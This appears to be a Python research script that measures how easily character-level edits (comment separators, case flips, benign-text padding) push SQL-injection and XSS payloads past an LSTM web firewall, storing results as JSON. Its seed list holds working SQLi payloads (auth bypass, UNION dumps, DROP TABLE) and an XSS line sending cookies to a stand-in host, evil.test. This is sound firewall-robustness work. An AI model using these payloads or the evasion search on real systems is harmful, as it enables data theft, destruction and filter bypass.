"""
Phase 7 — Adversarial Evasion Evaluation (black-box, character-level)

Target: Layer 1 of the DL-WAF — the trained LSTM as used by the deployed
reverse-proxy middleware (backend/middleware.py blocks on model label alone).

An adversarial attack here means: take a malicious SQLi/XSS payload the model
currently blocks, then apply small character-level perturbations (insertions,
case-flips, keyword separators, context stuffing) that keep the payload
recognisable as the same attack to the normalised signature layer, but drive
the model's confidence below the 0.5 threshold so a block never fires.

Method — greedy black-box search (no gradients; discrete text, one target query
per attempt):
  1. Seed = plain decoded attack payload with a baseline label of 1.
  2. Propose a single perturbation from the mutation pool.
  3. Re-score through inference.classify; accept only if confidence strictly
     decreases (or the label flips to 0) AND the double-decoded signature scan
     still recognises the request as that attack (semantic-preservation guard:
     an edit that breaks the payload so badly it is no longer detectable as
     SQLi/XSS is discarded).
  4. Repeat until the label flips to 0 or the attempt budget is exhausted.

The signature-preservation check also reports the layer-2 outcome of each
evaded payload, so the paper can separate "fooled the model" from "defeated the
whole WAF".

Usage:
    python -m evaluation.adversarial_eval
    python -m evaluation.adversarial_eval --max-attempts 150

Output:
    model/results/adversarial_results.json
"""

import argparse
import json
import os
import random
import time
from datetime import datetime, timezone

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT_DIR  = os.path.join(BASE_DIR, "model", "results")

SYNTHETIC_UA = "Mozilla/5.0 (Windows NT 6.1; WOW64)"

# Seeds are plain, decoded, model-blocked SQLi/XSS payloads. `preserved` lists
# substrings that must survive verbatim (rewrites inside them are rejected) so
# the attack never mutates away its own core. `critical` identities are checked
# additionally via the signature scan on every accepted edit.
SEEDS = [
    {"id": "sqli_auth_bypass", "category": "SQLi", "method": "GET", "uri": "/api/bank/accounts",
     "param": "q", "payload": "admin' OR '1'='1' --",
     "preserved": ["' OR '1'='1' --"]},
    {"id": "sqli_union_dump", "category": "SQLi", "method": "GET", "uri": "/api/bank/accounts",
     "param": "q", "payload": "0' UNION SELECT full_name, email, bvn FROM customers --",
     "preserved": ["UNION", "SELECT", "FROM customers"]},
    {"id": "sqli_union_passwords", "category": "SQLi", "method": "GET", "uri": "/api/bank/accounts",
     "param": "q", "payload": "' UNION SELECT password FROM users --",
     "preserved": ["UNION", "SELECT", "FROM users"]},
    {"id": "sqli_destructive", "category": "SQLi", "method": "POST", "uri": "/api/bank/transfer",
     "param": "account_no", "payload": "0'; DROP TABLE transactions; --",
     "preserved": ["DROP TABLE"]},
    {"id": "sqli_blind", "category": "SQLi", "method": "GET", "uri": "/api/bank/accounts",
     "param": "q", "payload": "x' AND unicode(substr(password,1,1))=83 --",
     "preserved": ["unicode(substr", "password"]},
    {"id": "xss_reflected", "category": "XSS", "method": "GET", "uri": "/api/bank/search",
     "param": "q", "payload": "<script>alert('XSS')</script>",
     "preserved": ["<script>", "</script>"]},
    {"id": "xss_cookie_steal", "category": "XSS", "method": "GET", "uri": "/api/bank/search",
     "param": "q", "payload": "<script>document.cookie</script>",
     "preserved": ["<script>", "document.cookie"]},
    {"id": "xss_img_onerror", "category": "XSS", "method": "POST", "uri": "/api/bank/support",
     "param": "message", "payload": "<img src=x onerror=alert(document.cookie)>",
     "preserved": ["onerror=alert"]},
    {"id": "xss_svg_onload", "category": "XSS", "method": "GET", "uri": "/api/bank/search",
     "param": "q", "payload": "<svg/onload=alert(1)>",
     "preserved": ["onload=alert"]},
    {"id": "xss_stored", "category": "XSS", "method": "POST", "uri": "/api/bank/support",
     "param": "message", "payload": "<script>fetch('//evil.test/steal?c='+document.cookie)</script>",
     "preserved": ["<script>", "document.cookie"]},
]

# Benign-looking filler used for context stuffing / token-dilution.
BENIGN_CHUNKS = [
    "admin", "login", "password=changeme", "GET /index.html HTTP/1.1",
    "Mozilla/5.0 X11 Linux", "0123456789", "Hello there", "welcome back",
    "loadpage","freshen","accounts overflow", "null", "undefined",
    "please wait while we process", "cache=false&preview=1",
]

FILLER_CHARS = [" ", "a", "A", "x", "1", "0", ".", "-"]


def _within_preserved(payload: str, pos: int, preserved: list[str]) -> bool:
    for tok in preserved:
        idx = 0
        while True:
            idx = payload.find(tok, idx)
            if idx == -1:
                break
            if idx < pos < idx + len(tok):
                return True
            idx += 1
    return False


def _preserved_intact(payload: str, preserved: list[str]) -> bool:
    return all(tok in payload for tok in preserved)


def build_request(p):
    method = p["method"]
    uri = p["uri"]
    pair = f"{p['param']}={p['payload']}"
    if method == "GET":
        url = f"{uri}?{pair}"
        body = ""
        content_type = ""
    else:
        url = uri
        body = pair
        content_type = "application/x-www-form-urlencoded"
    headers = {"content-type": content_type, "user-agent": SYNTHETIC_UA, "cookie": ""}
    return url, headers, body


class ModelScorer:
    """Wraps inference.classify to stay cheap to call from the search loop."""

    def __init__(self):
        from backend import inference
        inference.load_model_and_vocab()
        self._classify = inference.classify

    def score(self, p, payload):
        p = {**p, "payload": payload}
        url, headers, body = build_request(p)
        label, conf = self._classify(p["method"], url, headers, body)
        return label, conf


def signature_still_detects(p, payload) -> bool:
    """Double-decoded signature scan must still flag this exact attack request."""
    from backend.simulation.detection import signature_scan
    p = {**p, "payload": payload}
    url, headers, body = build_request(p)
    sig = signature_scan(f"{url}\n{body}")
    return sig["matched"]


def _propose(payload: str, preserved: list[str], rng: random.Random) -> str | None:
    """Return one mutated payload, or None if no valid op applies."""
    n = len(payload)
    if n < 4:
        return None

    op = rng.choice(range(6))

    if op == 0:  # insert a filler char at a safe position
        for _ in range(40):
            pos = rng.randrange(n)
            if not _within_preserved(payload, pos, preserved):
                return payload[:pos] + rng.choice(FILLER_CHARS) + payload[pos:]
        return payload + rng.choice(FILLER_CHARS)

    if op == 1:  # insert a separator outside preserved tokens (newline / tab)
        for _ in range(40):
            pos = rng.randrange(n)
            if not _within_preserved(payload, pos, preserved):
                sep = rng.choice(["\n", "\t", "\r", "  ", "/**/", "/*AZ*/"])
                return payload[:pos] + sep + payload[pos:]
        return payload

    if op == 2:  # duplicate a char outside preserved tokens
        for _ in range(40):
            pos = rng.randrange(n)
            if not _within_preserved(payload, pos, preserved):
                return payload[:pos] + payload[pos] + payload[pos:]
        return payload

    if op == 3:  # swap two adjacent chars outside preserved tokens
        for _ in range(60):
            pos = rng.randrange(n - 1)
            if not _within_preserved(payload, pos, preserved) and not _within_preserved(payload, pos + 1, preserved):
                return payload[:pos] + payload[pos + 1] + payload[pos] + payload[pos + 2:]
        return payload

    if op == 4:  # case-flip a letter anywhere (signature scan is IGNORECASE-safe)
        letters = [i for i, ch in enumerate(payload) if ch.isalpha()]
        if not letters:
            return payload
        pos = rng.choice(letters)
        ch = payload[pos]
        return payload[:pos] + (ch.swapcase() if ch != ch.upper() else ch.lower()) + payload[pos + 1:]

    # context stuffing — dilute the token distribution with benign text
    chunk = rng.choice(BENIGN_CHUNKS)
    if rng.random() < 0.5:
        return payload + chunk
    return chunk + payload


def evade_one(p, scorer: ModelScorer, max_attempts: int, seed: int) -> dict:
    rng = random.Random(f"{seed}-{p['id']}")

    base_label, base_conf = scorer.score(p, p["payload"])
    if base_label != 1:
        return {
            "payload_id": p["id"], "category": p["category"],
            "baseline_label": base_label, "baseline_conf": round(base_conf, 6),
            "skipped": True, "reason": "baseline label is not 1 — not a valid seed",
            "evaded": None,
        }

    best_payload = p["payload"]
    best_conf = base_conf
    evaded = False
    attempts = 0
    sig_ok = True

    t0 = time.perf_counter()
    while not evaded and attempts < max_attempts:
        candidate_payload = _propose(best_payload, p["preserved"], rng)
        attempts += 1
        if candidate_payload is None or not _preserved_intact(candidate_payload, p["preserved"]):
            continue

        label, conf = scorer.score(p, candidate_payload)
        if conf < best_conf:
            if signature_still_detects(p, candidate_payload):
                best_payload, best_conf = candidate_payload, conf
            if label != 1:
                evaded = True
                best_conf = conf
                sig_ok = signature_still_detects(p, best_payload)
    latency_ms = round((time.perf_counter() - t0) * 1000, 1)

    return {
        "payload_id": p["id"],
        "category": p["category"],
        "baseline_label": base_label,
        "baseline_conf": round(base_conf, 6),
        "evaded": evaded,
        "final_label": 0 if evaded else 1,
        "final_conf": round(best_conf, 6),
        "confidence_delta": round(best_conf - base_conf, 6),
        "attempts": attempts,
        "time_ms": latency_ms,
        "signature_still_detects": sig_ok,
        "mutated_payload": best_payload if (evaded and sig_ok) else best_payload,
        "mutation_length": len(best_payload) - len(p["payload"]),
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--max-attempts", type=int, default=120,
                        help="perturbation budget per seed payload")
    parser.add_argument("--master-seed", type=int, default=42)
    args = parser.parse_args()

    print(f"[1] Loading model …")
    scorer = ModelScorer()

    print(f"[2] Running greedy evasion search "
          f"({len(SEEDS)} seeds, ≤{args.max_attempts} attempts each) …")
    results = [evade_one(p, scorer, args.max_attempts, args.master_seed) for p in SEEDS]

    valid = [r for r in results if not r.get("skipped")]
    evaded = [r for r in valid if r["evaded"]]

    summary = {
        "seeds_total": len(SEEDS),
        "valid_seeds": len(valid),
        "evaded_model_only": len(evaded),
        "evasion_rate_model_only": round(len(evaded) / len(valid), 4) if valid else None,
        "evaded_still_signature_detectable": sum(1 for r in evaded if r["signature_still_detects"]),
        "mean_attempts": round(sum(r["attempts"] for r in valid) / len(valid), 2) if valid else None,
        "mean_conf_delta": round(
            sum(r["confidence_delta"] for r in evaded) / len(evaded), 6
        ) if evaded else None,
        "max_attempts_per_seed": args.max_attempts,
    }

    os.makedirs(OUT_DIR, exist_ok=True)
    out_path = os.path.join(OUT_DIR, "adversarial_results.json")
    with open(out_path, "w") as f:
        json.dump({
            "experiment": "adversarial_evasion_model_only",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target": "Layer 1 LSTM as enforced by reverse-proxy middleware (threshold 0.5)",
            "method": "greedy black-box character-level perturbation (no gradients)",
            "summary": summary,
            "per_payload": results,
        }, f, indent=2)
    print(f"      Saved → {out_path}")

    print("\n[3] Results ───────────────────────────────────────────")
    print(f"{'Payload':<24}{'Cat':<4}{'base':>7}{'final':>7}{'Δ':>8}  evaded")
    for r in valid:
        print(f"{r['payload_id']:<24}{r['category']:<4}{r['baseline_conf']:>7.3f}"
              f"{r['final_conf']:>7.3f}{r['confidence_delta']:>+8.3f}  "
              f"{'YES' if r['evaded'] else 'no'}")
    if skipped := [r for r in results if r.get("skipped")]:
        print("skipped (baseline already benign): " + ", ".join(r["payload_id"] for r in skipped))

    print(f"\n── Model-only adversarial evasion rate ──")
    print(f"  {len(evaded)}/{len(valid)} payloads ({(len(evaded) / len(valid)):.1%}) driven below 0.5")
    print(f"  of those, signature-confirmed still-detectable: "
          f"{sum(1 for r in evaded if r['signature_still_detects'])}/{len(evaded)}")


if __name__ == "__main__":
    main()